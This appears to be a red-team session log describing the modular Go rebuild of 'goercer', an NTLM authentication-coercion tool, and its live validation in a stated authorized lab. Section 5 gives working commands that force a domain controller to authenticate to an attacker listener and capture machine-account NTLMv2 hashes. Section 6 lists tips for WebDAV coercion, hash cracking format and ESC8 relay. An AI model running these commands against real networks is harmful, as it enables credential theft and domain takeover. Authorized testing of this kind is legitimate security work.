# Session Log — goercer Modular Rebuild + Live Validation

Date: 2026-08-08
Context: Authorized red-team lab (AGENTS.MD). Rebuilt `goercer` from a 2606-line
monolith into a modular Go project, then validated it live against a domain
controller (DC) and captured machine-account NTLMv2 hashes over both SMB and
HTTP/WebDAV.

---

## 1. Goal

Original `goercer` (github.com/ineffectivecoder/goercer) is an NTLM credential
coercion tool (PetitPotam, SpoolSample, ShadowCoerce, DFSCoerce) using
authenticated DCERPC with PKT_PRIVACY (NTLM sign+seal). It was one 2606-line
`goercer.go`. Requirement: rebuild it to be modular, with better coding
practices, without changing behaviour.

## 2. New architecture

```
cmd/goercer/main.go        entrypoint: parse -> connect -> dispatch -> output
internal/config            Config value object + validation
internal/cli               flag parsing + credential prompting + HTTP warnings
internal/smbxport          go-smb session wrapper (connect, proxy, open pipe)
internal/ntlm              NTLM message build, NTLMv2 crypto, RC4 stream, MIC
internal/dcerpc            PKT_PRIVACY packets (bind/auth3/request), fault classify
internal/callback          UNC / WebDAV path builders + variations
internal/coercer/          Coercer interface + registry + shared engine
   petitpotam.go  spoolsample.go  shadowcoerce.go  dfscoerce.go
```

Key decisions:
- **Interface + registry**, no switch statements. Techniques implement
  `coercer.Coercer` and self-register via `init()`. Adding a technique = one
  new file + one `Register(...)` line.
- **Keep go-smb + raw DCERPC.** Transport stays `github.com/jfjallid/go-smb`;
  the hand-written PKT_PRIVACY packet layer lives in `internal/dcerpc`, the
  NTLM crypto in `internal/ntlm`. `smbxport.Pipe` satisfies `dcerpc.Transport`.
- **Shared output type** (`coercer.Out`) with optional JSON (`-j`), replacing
  scattered `fmt.Printf`.
- **Fault classification** in `internal/dcerpc`: `ERROR_BAD_NETPATH` (0x6f7) ==
  success signal; `ACCESS_DENIED` (0x5) == patched/blocked. Methods map via
  `dcerpc.IsCoercionSuccess` / `IsAccessDenied`.

## 3. Compile/runtime fixes found during verification

The static review + real compiler caught issues the initial manual pass missed:

1. **`genBuffer.Write` did not satisfy `io.Writer`.** `binary.Write(buf, ...)`
   failed to compile. Fixed `Write([]byte)` to return `(int, error)`.
2. **go-smb uses `uint64` offsets**, not `int64` (verified in
   `go-smb@v0.6.7/smb/session.go:1569,1764`). Updated `dcerpc.Transport` and
   `smbxport.Pipe` accordingly.
3. **`WriteByte` flag** in `go vet` required `WriteByte(byte) error`.
4. **petitpotam.go: `uint32` passed where `int` expected** (`trail`). Fixed.
5. **Header call_id mismatch**: request PDUs use call_id 2, bind/auth3 use 1;
   a redundant auth-length write was removed from `AuthenticatedRequest`.

## 4. Verification (real toolchain)

Installed Go 1.26.5 via winget. All clean:
- `go mod tidy -diff` -> tidy-clean (go.sum generated)
- `go build ./...` -> compiles
- `go vet ./...` -> clean
- `gofmt -w ./cmd ./internal` -> clean
- Binary builds: `goercer.exe` (~6.1 MB)

Runtime smoke tests (no live target needed):
- `--help` shows all flags/short-aliases correct.
- Invalid method / invalid NTLM hash rejected cleanly.
- HTTP mode with a frame-only listener (127.0.0.1) passes parsing and fails
  only at the SMB connect, proving the pipeline up to the network boundary.

## 5. Live validation (authorized lab)

Tools: `goercer` (coerce) + `credgoblin` (capture/relay, github.com/
ineffectivecoder/credgoblin).

### SMB coercion (SpoolSample, no --http)
```
.\goercer.exe -t 192.168.90.11 -l 10.1.1.99 -u stabby -d rootshell.ninja -m spoolsample
[+] Opnum 65 (RpcRemoteFindFirstPrinterChangeNotificationEx) triggered coercion
```
Result: 4x machine-account NTLMv2 hashes captured on SMB:445
(`DESHI$::ROOTSHELL`), the DC's machine account. Validates the rebuilt SMB
auth, DCERPC PKT_PRIVACY bind, and SpoolSample printer-handle flow.

### HTTP/WebDAV coercion (--http)
First attempt failed silently: listener was a **bare IP** (`-l 10.1.1.99`),
and WebClient only activates for hostnames, not IPs, so nothing reached :80.

Fixed by:
1. Starting WebClient on the target: `sc start webclient` (was the blocker).
2. Using a hostname for `-l` that resolves to the attacker box.

```
.\goercer.exe -t 192.168.90.11 -l bingbong.rootshell.ninja -u stabby -d rootshell.ninja -m spoolsample --http
```
Result: 1x HTTP:80 capture with SPN `HTTP/bingbong.rootshell.ninja` and
`path=/test/pipe/spoolss` — proves WebClient/WebDAV callback works. This is the
channel required for ESC8 (ADCS) / Exchange relay.

## 6. Lessons / gotchas (codify these)

- **WebClient service must be RUNNING on the target** for any
  `\\host@80\...` WebDAV path to become HTTP. Check `sc query webclient`,
  start with `sc start webclient`.
- **Listener must be a HOSTNAME, not a bare IP**, or WebClient never
  activates and the target silently falls back to SMB.
- Block port 445 on the attacker box when doing HTTP coercion (Windows tries
  SMB first).
- SpoolSample is generally more reliable than PetitPotam for HTTP coercion.
- Hashcat format: captured NTLMv2 lines in credgoblin `hashes.txt` are
  already `-m 5600` (netntlmv2) format.

### Added guard
In `internal/cli/cli.go`, `normalizeHTTPListener` now warns when `--http` is
used with a bare-IP listener:
```
[!] WARNING: Listener is an IP address - WebClient will NOT trigger HTTP.
[!]   WebClient only activates for hostnames, not bare IPs.
```
This fires before any connection attempt. Verified: warns on IP, no false
positive on hostname. `go build`, `go vet`, `gofmt` all clean after change.

## 7. Current repo state

```
cmd/goercer/main.go
internal/config/config.go
internal/cli/cli.go
internal/smbxport/smbxport.go
internal/ntlm/ntlm.go
internal/dcerpc/dcerpc.go
internal/callback/callback.go
internal/coercer/{coercer,bind,petitpotam,spoolsample,shadowcoerce,dfscoerce}.go
go.mod / go.sum / README.md / build.sh / AGENTS.MD
```

Build artifact `goercer.exe` at repo root (from verification); `build.sh`
outputs to `bin/`.

## 8. Open / next steps

- Optional: companion HTTP warning (block port 445) in `--http` mode.
- Optional: GitHub Actions CI (vet + build + lint) for future changes.
- Optional: same modular cleanup pass on `credgoblin` (has stray
  `test_simple_mic.go` at root, debug scripts `capture_ldap_packets.sh`,
  `test_ldap/`).
